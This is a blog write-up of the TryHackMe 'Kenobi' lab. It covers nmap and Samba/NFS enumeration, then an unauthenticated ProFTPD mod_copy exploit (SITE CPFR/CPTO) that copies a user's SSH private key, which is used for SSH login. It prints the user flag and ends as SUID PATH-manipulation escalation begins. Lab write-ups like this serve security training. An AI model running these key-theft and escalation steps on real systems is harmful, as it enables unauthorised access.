<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="theme" content="Chirpy v2.7.2"><meta name="generator" content="Jekyll v4.2.0" /><meta property="og:title" content="Kenobi" /><meta name="author" content="Dimitrios Tsarouchas" /><meta property="og:locale" content="en_US" /><meta name="description" content="This is my personal website where I upload content I find useful for me and share it to people that are interested in cybersecurity. Everything posted in this website is for ethical academic research and I am not responsible if anyone will use the information provided here for illegal activities." /><meta property="og:description" content="This is my personal website where I upload content I find useful for me and share it to people that are interested in cybersecurity. Everything posted in this website is for ethical academic research and I am not responsible if anyone will use the information provided here for illegal activities." /><link rel="canonical" href="https://dimitrios-tsarouchas.tech//posts/Kenobi/" /><meta property="og:url" content="https://dimitrios-tsarouchas.tech//posts/Kenobi/" /><meta property="og:site_name" content="Dimitris Tsarouchas" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-01-18T12:55:00+00:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Kenobi" /><meta name="twitter:site" content="@DimitriosTsaro3" /><meta name="twitter:creator" content="@Dimitrios Tsarouchas" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"author":{"@type":"Person","name":"Dimitrios Tsarouchas"},"description":"This is my personal website where I upload content I find useful for me and share it to people that are interested in cybersecurity. Everything posted in this website is for ethical academic research and I am not responsible if anyone will use the information provided here for illegal activities.","url":"https://dimitrios-tsarouchas.tech//posts/Kenobi/","@type":"BlogPosting","headline":"Kenobi","dateModified":"2021-01-27T22:21:32+00:00","datePublished":"2021-01-18T12:55:00+00:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://dimitrios-tsarouchas.tech//posts/Kenobi/"},"@context":"https://schema.org"}</script><title>Kenobi | Dimitris Tsarouchas</title><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="preload" href="/assets/css/post.css" as="style"><link rel="stylesheet" href="/assets/css/post.css"><link rel="preload" as="style" href="/assets/css/lib/bootstrap-toc.min.css"><link rel="stylesheet" href="/assets/css/lib/bootstrap-toc.min.css" /> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script async src="/assets/js/post.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/img/picture%20me.jpeg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Dimitris Tsarouchas</a></div><br><div class="site-subtitle font-italic">Cybersecurity, CTFs and Technology</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/tabs/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tabs/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/tabs/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/tabs/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <script src="https://tryhackme.com/badge/44835"></script> <a href="https://github.com/DimitriosTsarouchas" aria-label="github" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://linkedin.com/in/dimitrios-tsarouchas" aria-label="linkedin" class="order-4" target="_blank" rel="noopener"> <i class="fab fa-linkedin-in"></i> </a> <a href="https://twitter.com/DimitriosTsaro3" aria-label="twitter" class="order-5" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['dimitristsaroucha','gmail.com'].join('@')" aria-label="email" class="order-6" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" class="order-7" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>Kenobi</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Kenobi</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Mon, Jan 18, 2021, 12:55 PM +0000" > Jan 18 <i class="unloaded">2021-01-18T12:55:00+00:00</i> </span> by <span class="author"> Dimitrios Tsarouchas </span></div><div> <span> Updated <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Wed, Jan 27, 2021, 10:21 PM +0000" > Jan 27 <i class="unloaded">2021-01-27T22:21:32+00:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2324 words">12 min</span></div></div><div class="post-content"><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://i.imgur.com/OcA2KrK.gif" alt="Kenobi" /></p><h2 id="introduction">Introduction</h2><p>We are going to exploit a Linux machine called <a href="https://tryhackme.com/room/kenobi" target="_blank">Kenobi</a>. We will enumerate a share service called Samba and try to get initial access on the machine by manipulating a vulnerable version of ProFTPD. Once we get the inital foothold on Kenobi we will escalate our privileges to root via an SUID binary by manipulating the path variable.</p><h4 id="what-is-samba">What is Samba?</h4><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://i.imgur.com/O8S93Kr.png" alt="Samba" /></p><p>Samba is the standard Windows interoperability suite of programs for Linux and Unix (<a href="https://www.samba.org/samba/what_is_samba.html" target="_blank">samba.org</a>). Samba allows end users to access and use files, printers and other commonly shared resources on a corporate network or the Internet. Its often referred to as a network file system <a href="https://en.wikipedia.org/wiki/Network_File_System" target="_blank">(NFS</a>).</p><p>Samba is based on the common client/server protocol of Server Message Block (<a href="https://docs.microsoft.com/en-us/windows/win32/fileio/microsoft-smb-protocol-and-cifs-protocol-overview" target="_blank">SMB</a>). SMB is developed only for Windows, without Samba, other computer platforms would be isolated from Windows machines, even if they were part of the same network.</p><p>SMB has two ports, 445 and 139.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://i.imgur.com/bkgVNy3.png" alt="SMB-Ports" /></p><h2 id="enumerating-kenobi">Enumerating Kenobi</h2><p>First step is to enumerate the target machine using nmap scan to check the number of open ports.</p><div class="language-terminal highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
</pre><td class="rouge-code"><pre><span class="gp">root@kali:~#</span><span class="w"> </span><span class="nb">sudo </span>nmap <span class="nt">-T4</span> <span class="nt">-A</span> <span class="nt">-p-</span> 10.10.141.147
<span class="go">
PORT      STATE SERVICE     VERSION
21/tcp    open  ftp         ProFTPD 1.3.5
</span><span class="gp">22/tcp    open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux;</span><span class="w"> </span>protocol 2.0<span class="o">)</span>
<span class="go">| ssh-hostkey: 
|   2048 b3:ad:83:41:49:e9:5d:16:8d:3b:0f:05:7b:e2:c0:ae (RSA)
|   256 f8:27:7d:64:29:97:e6:f8:65:54:65:22:f7:c8:1d:8a (ECDSA)
|_  256 5a:06:ed:eb:b6:56:7e:4c:01:dd:ea:bc:ba:fa:33:79 (ED25519)
80/tcp    open  http        Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/admin.html
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
</span><span class="gp">111/tcp   open  rpcbind     2-4 (RPC #</span>100000<span class="o">)</span>
<span class="go">| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  2,3,4       2049/udp   nfs
|   100003  2,3,4       2049/udp6  nfs
|   100005  1,2,3      34833/tcp6  mountd
|   100005  1,2,3      54131/udp6  mountd
|   100005  1,2,3      57546/udp   mountd
|   100005  1,2,3      60079/tcp   mountd
|   100021  1,3,4      41713/tcp   nlockmgr
|   100021  1,3,4      45187/tcp6  nlockmgr
|   100021  1,3,4      53077/udp   nlockmgr
|   100021  1,3,4      58336/udp6  nlockmgr
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
</span><span class="gp">2049/tcp  open  nfs_acl     2-3 (RPC #</span>100227<span class="o">)</span>
<span class="gp">36673/tcp open  mountd      1-3 (RPC #</span>100005<span class="o">)</span>
<span class="gp">36841/tcp open  mountd      1-3 (RPC #</span>100005<span class="o">)</span>
<span class="gp">41713/tcp open  nlockmgr    1-4 (RPC #</span>100021<span class="o">)</span>
<span class="gp">60079/tcp open  mountd      1-3 (RPC #</span>100005<span class="o">)</span>
<span class="go">
Network Distance: 1 hop
</span><span class="gp">Service Info: Host: KENOBI;</span><span class="w"> </span>OSs: Unix, Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
<span class="go">
Host script results:
|_clock-skew: mean: 1h59m59s, deviation: 3h27m51s, median: -1s
</span><span class="gp">|_nbstat: NetBIOS name: KENOBI, NetBIOS user: &lt;unknown&gt;</span>, NetBIOS MAC: &lt;unknown&gt; <span class="o">(</span>unknown<span class="o">)</span>
<span class="go">| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: kenobi
|   NetBIOS computer name: KENOBI\x00
|   Domain name: \x00
|   FQDN: kenobi
|_  System time: 2021-01-11T12:32:36-06:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-01-11T18:32:36
|_  start_date: N/A
</span></pre></table></code></div></div><h3 id="enumerating-samba-for-shares">Enumerating Samba for shares</h3><p>We found through the nmap scan that on the target machine the ports <strong>139</strong> and <strong>445</strong> are open and running a Samba service. Nmap comes again in handy, this time we will enumerate the machine for SMB shares using two NSE scripts against the port 445.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>1. smb-enum-shares.nse
2. smb-enum-users.nse
</pre></table></code></div></div><h4 id="running-nmap-using-the-nse-scripts">Running nmap using the NSE scripts</h4><div class="language-terminal highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
</pre><td class="rouge-code"><pre><span class="gp">root@kali:~#</span><span class="w"> </span><span class="nb">sudo </span>nmap <span class="nt">-p</span> 445 <span class="nt">--script</span><span class="o">=</span>smb-enum-shares.nse,smb-enum-users.nse 10.10.141.147
<span class="go">
PORT    STATE SERVICE
445/tcp open  microsoft-ds
MAC Address: 02:E7:9C:64:05:95 (Unknown)

Host script results:
| smb-enum-shares: 
|   account_used: guest
</span><span class="gp">|   \\10.10.141.147\IPC$</span>: 
<span class="go">|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (kenobi server (Samba, Ubuntu))
|     Users: 1
</span><span class="gp">|     Max Users: &lt;unlimited&gt;</span><span class="w">
</span><span class="go">|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.141.147\anonymous: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Users: 0
</span><span class="gp">|     Max Users: &lt;unlimited&gt;</span><span class="w">
</span><span class="go">|     Path: C:\home\kenobi\share
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
</span><span class="gp">|   \\10.10.141.147\print$</span>: 
<span class="go">|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
</span><span class="gp">|     Max Users: &lt;unlimited&gt;</span><span class="w">
</span><span class="go">|     Path: C:\var\lib\samba\printers
</span><span class="gp">|     Anonymous access: &lt;none&gt;</span><span class="w">
</span><span class="gp">|_    Current user access: &lt;none&gt;</span><span class="w">
</span><span class="go">|_smb-enum-users: ERROR: Script execution failed (use -d to debug)
</span></pre></table></code></div></div><p>We can see there are three shares in the machine and from those three we are interested in the <strong>anonymous share</strong> where we can login without using user credentials.</p><h3 id="accessing-the-anonymous-share">Accessing the anonymous share</h3><p>We will use the <code class="language-plaintext highlighter-rouge">smbclient</code> to connect to the anonymous share. Smbclient is installed in most Linux distributions and it can also be downloaded from <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbclient.py" target="_blank">github</a>.</p><div class="language-terminal highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="gp">root@kali:~#</span><span class="w"> </span><span class="nb">sudo </span>smbclient //10.10.141.147/anonymous
<span class="go">Enter WORKGROUP\root's password: 
Try "help" to get a list of possible commands.
</span><span class="gp">smb: \&gt;</span><span class="w"> </span><span class="nb">help</span>
</pre></table></code></div></div><p>We will download the anonymous share to our local machine to examine the files in case we can find something useful.</p><div class="language-terminal highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="gp">root@kali:~#</span><span class="w"> </span><span class="nb">sudo </span>smbget <span class="nt">-R</span> smb://10.10.141.14/anonymous
</pre></table></code></div></div><p>When we open the file on the share we can see some valuable information about the SSH key and the ProFTPD server.</p><h3 id="enumerating-the-network-file-system">Enumerating the Network File System</h3><p>Our nmap port scan shown that the <code class="language-plaintext highlighter-rouge">rpcbind</code> service which will give us access to a network file system is running on <strong>port 111</strong> . We will go ahead and enumerate that port using three NSE scripts <code class="language-plaintext highlighter-rouge">nfs-ls</code>, <code class="language-plaintext highlighter-rouge">nfs-statfs</code>, <code class="language-plaintext highlighter-rouge">nfs-showmount</code>.</p><div class="language-terminal highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
</pre><td class="rouge-code"><pre><span class="gp">root@kali:~#</span><span class="w"> </span>nmap <span class="nt">-p</span> 111 <span class="nt">--script</span><span class="o">=</span>nfs-ls,nfs-statfs,nfs-showmount 10.10.141.147
<span class="go">Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-11 18:46 UTC
Nmap scan report for ip-10-10-141-147.eu-west-1.compute.internal (10.10.141.147)
Host is up (0.00020s latency).

PORT    STATE SERVICE
111/tcp open  rpcbind
| nfs-ls: Volume /var
|   access: Read Lookup NoModify NoExtend NoDelete NoExecute
| PERMISSION  UID  GID  SIZE  TIME                 FILENAME
| rwxr-xr-x   0    0    4096  2019-09-04T08:53:24  .
| rwxr-xr-x   0    0    4096  2019-09-04T12:27:33  ..
| rwxr-xr-x   0    0    4096  2019-09-04T12:09:49  backups
| rwxr-xr-x   0    0    4096  2019-09-04T10:37:44  cache
| rwxrwxrwt   0    0    4096  2019-09-04T08:43:56  crash
| rwxrwsr-x   0    50   4096  2016-04-12T20:14:23  local
| rwxrwxrwx   0    0    9     2019-09-04T08:41:33  lock
| rwxrwxr-x   0    108  4096  2019-09-04T10:37:44  log
| rwxr-xr-x   0    0    4096  2019-01-29T23:27:41  snap
| rwxr-xr-x   0    0    4096  2019-09-04T08:53:24  www
|_
| nfs-showmount: 
|_  /var *
| nfs-statfs: 
|   Filesystem  1K-blocks  Used       Available  Use%  Maxfilesize  Maxlink
|_  /var        9204224.0  1836532.0  6877096.0  22%   16.0T        32000
MAC Address: 02:E7:9C:64:05:95 (Unknown)

</span></pre></table></code></div></div><p>According to the output of nmap scan we can see that <code class="language-plaintext highlighter-rouge">/var</code> is a mount point on the Kenobi’s filesystem.</p><h2 id="gain-initial-access-with-proftpd">Gain initial access with ProFtpd</h2><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://i.imgur.com/L54MBzX.png" alt="ProFTPD" /></p><p><strong>ProFtpd</strong> is a free and open-source FTP server, compatible with Unix and Windows systems and has been vulnerable in some older software versions. We need to check the version of ProFTPD in case there is a vulnerability we can exploit and gain the initial access in the machine. We will use netcat to connect to the machine on the <strong>port 21</strong> and get information about the version.</p><div class="language-terminal highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="gp">root@kali:~#</span><span class="w"> </span>nc 10.10.141.147 21
<span class="go">220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.141.147]
</span></pre></table></code></div></div><p>Kenobi’s FTP server is running the <strong>ProFTPD v1.3.5</strong>. We need to find an exploit from ProFtpd’s <code class="language-plaintext highlighter-rouge">mod_copy</code> module. The <code class="language-plaintext highlighter-rouge">mod_copy</code> module implements <code class="language-plaintext highlighter-rouge">SITE CPFR</code> (copy from) and <code class="language-plaintext highlighter-rouge">SITE CPTO</code> (copy to) commands, which can be used to copy files/directories from one place to another on the server without having to transfer the data to the client and back (<a href="http://www.proftpd.org/docs/contrib/mod_copy.html" target="_blank">proftpd.org</a>). Any unauthenticated client can leverage these commands to copy files from any part of the filesystem to a chosen destination. We know that the FTP service is running as the Kenobi user (from the file on the share) and an ssh key is generated for that user. We’re now going to copy Kenobi’s private key using <code class="language-plaintext highlighter-rouge">SITE CPFR</code> and <code class="language-plaintext highlighter-rouge">SITE CPTO</code> commands.</p><div class="language-terminal highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="gp">root@kali:~#</span><span class="w"> </span>nc 10.10.141.147 21
<span class="go">220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.141.147]
SITE CPFR /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name
SITE CPTO /var/tmp/id_rsa
250 Copy successful
</span></pre></table></code></div></div><p>From the <a href="#enumerating-the-network-file-system">Enumerating the Network File System</a> section we found that the <code class="language-plaintext highlighter-rouge">/var</code> directory is a mount point. By gaining access from ProFTPD we moved Kenobi’s private key to the <code class="language-plaintext highlighter-rouge">/var</code> directory in our machine, and now we will mount it to our new <code class="language-plaintext highlighter-rouge">/mnt/kenobiNFS/</code> direcotry.</p><div class="language-terminal highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre><td class="rouge-code"><pre><span class="gp">root@kali:~#</span><span class="nb">mkdir</span> /mnt/kenobiNFS
<span class="gp">root@kali:~#</span><span class="w"> </span><span class="nb">sudo </span>mount 10.10.141.147:/var /mnt/kenobiNFS/
<span class="gp">root@kali:~#</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-la</span> /mnt/kenobiNFS/
<span class="go">total 56
drwxr-xr-x 14 root root    4096 Sep  4  2019 .
drwxr-xr-x  3 root root    4096 Jan 11 18:59 ..
drwxr-xr-x  2 root root    4096 Sep  4  2019 backups
drwxr-xr-x  9 root root    4096 Sep  4  2019 cache
drwxrwxrwt  2 root root    4096 Sep  4  2019 crash
drwxr-xr-x 40 root root    4096 Sep  4  2019 lib
drwxrwsr-x  2 root staff   4096 Apr 12  2016 local
</span><span class="gp">lrwxrwxrwx  1 root root       9 Sep  4  2019 lock -&gt;</span><span class="w"> </span>/run/lock
<span class="go">drwxrwxr-x 10 root crontab 4096 Sep  4  2019 log
drwxrwsr-x  2 root mail    4096 Feb 26  2019 mail
drwxr-xr-x  2 root root    4096 Feb 26  2019 opt
</span><span class="gp">lrwxrwxrwx  1 root root       4 Sep  4  2019 run -&gt;</span><span class="w"> </span>/run
<span class="go">drwxr-xr-x  2 root root    4096 Jan 29  2019 snap
drwxr-xr-x  5 root root    4096 Sep  4  2019 spool
drwxrwxrwt  6 root root    4096 Jan 11 18:57 tmp
drwxr-xr-x  3 root root    4096 Sep  4  2019 www
</span></pre></table></code></div></div><p>We have created a network mount on our deployed machine and we can go and get the private key from the <code class="language-plaintext highlighter-rouge">/tmp</code> directory that will let us login to Kenobi’s account.</p><div class="language-terminal highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
</pre><td class="rouge-code"><pre><span class="gp">root@kali:/#</span><span class="w"> </span><span class="nb">cp</span> /mnt/kenobiNFS/tmp/id_rsa <span class="nb">.</span>
<span class="gp">root@kali:/#</span><span class="w"> </span><span class="nb">sudo chmod </span>600 id_rsa 
<span class="gp">root@kali:/#</span><span class="w"> </span>ssh <span class="nt">-i</span> id_rsa kenobi@10.10.141.147
<span class="go">load pubkey "id_rsa": invalid format
The authenticity of host '10.10.141.147 (10.10.141.147)' can't be established.
ECDSA key fingerprint is SHA256:uUzATQRA9mwUNjGY6h0B/wjpaZXJasCPBY30BvtMsPI.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.141.147' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.8.0-58-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

103 packages can be updated.
65 updates are security updates.


Last login: Wed Sep  4 07:10:15 2019 from 192.168.1.147
</span><span class="gp">To run a command as administrator (user "root"), use "sudo &lt;command&gt;</span><span class="s2">".
</span><span class="go">See "man sudo_root" for details.

</span><span class="gp">kenobi@kenobi:~$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-l</span>
<span class="go">total 8
drwxr-xr-x 2 kenobi kenobi 4096 Sep  4  2019 share
-rw-rw-r-- 1 kenobi kenobi   33 Sep  4  2019 user.txt
</span><span class="gp">kenobi@kenobi:~$</span><span class="w"> </span><span class="nb">cat </span>user.txt 
<span class="go">d0b0f3f53b6caa532a83915e19224899
</span></pre></table></code></div></div><p>We have successfully copied the <code class="language-plaintext highlighter-rouge">id_rsa</code> private key and we changed the file permissions to <strong>600</strong> where only the owner has full read and write access to the file. Then we connected to the remote machine via <code class="language-plaintext highlighter-rouge">SSH</code> using that <code class="language-plaintext highlighter-rouge">id_rsa</code> key to login to Kenobi’s account. Finally, we logged in as the kenobi account and printed the <code class="language-plaintext highlighter-rouge">user.txt</code> flag (<em>d0b0f3f53b6caa532a83915e19224899</em>).</p><h2 id="privilege-escalation-with-path-variable-manipulation">Privilege Escalation with Path Variable Manipulation</h2><p>In this section we will focus on escalting our privileges to get the root flag. First, we need to search the system if there are files that run with the SUID bit set. If we find any file that has the SUID bit set, we can execute it having the privileges of the owner of the file. We can enumerate all binaries to check if they have SUID permissions using the follwing command.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>find / -perm -u=s -type f 2&gt;/dev/null
</pre></table></code></div></div><ul><li><code class="language-plaintext highlighter-rouge">/</code> denotes that we will start from the top (root) of the file system and find every directory<li><code class="language-plaintext highlighter-rouge">-perm</code> denotes that we will search for the permissions that follow:<li><code class="language-plaintext highlighter-rouge">-u=s</code> denotes that we will look for files which are owned by the root user<li><code class="language-plaintext highlighter-rouge">-type</code> states the type of file we are looking for<li><code class="language-plaintext highlighter-rouge">f</code> denotes a regular file, excluding directories and special files<li><code class="language-plaintext highlighter-rouge">2&gt;/dev/null</code> means we will redirect all errors to /dev/null. In other words, we will ignore all errors.</ul><p>After this command is executed a list of binaries that can be executed as root are shown.</p><div class="language-terminal highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
</pre><td class="rouge-code"><pre><span class="gp">kenobi@kenobi:~$</span><span class="w"> </span>find / <span class="nt">-perm</span> <span class="nt">-u</span><span class="o">=</span>s <span class="nt">-type</span> f 2&gt;/dev/null
<span class="go">/sbin/mount.nfs
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/newuidmap
/usr/bin/gpasswd
/usr/bin/menu
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/at
/usr/bin/newgrp
/bin/umount
/bin/fusermount
/bin/moun
/bin/ping
/bin/su
/bin/ping6
</span></pre></table></code></div></div><p>A binary that looks out of the ordinary is the <code class="language-plaintext highlighter-rouge">/usr/bin/menu</code>, so we will use the <code class="language-plaintext highlighter-rouge">strings</code> command to see the text inside of the binary file.</p><div class="language-terminal highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre><td class="rouge-code"><pre><span class="gp">kenobi@kenobi:~$</span><span class="w"> </span>strings /usr/bin/menu
<span class="go">/lib64/ld-linux-x86-64.so.2
libc.so.6
setuid
__isoc99_scanf
puts
__stack_chk_fail
printf
system
__libc_start_main
__gmon_start__
GLIBC_2.7
GLIBC_2.4
GLIBC_2.2.5
UH-`
AWAVA
AUATL
[]A\A]A^A_
***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :
curl -I localhost
uname -r
ifconfig
</span></pre></table></code></div></div><p>As this file runs with root user privileges, we can manipulate the path to gain a shell.</p><div class="language-terminal highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
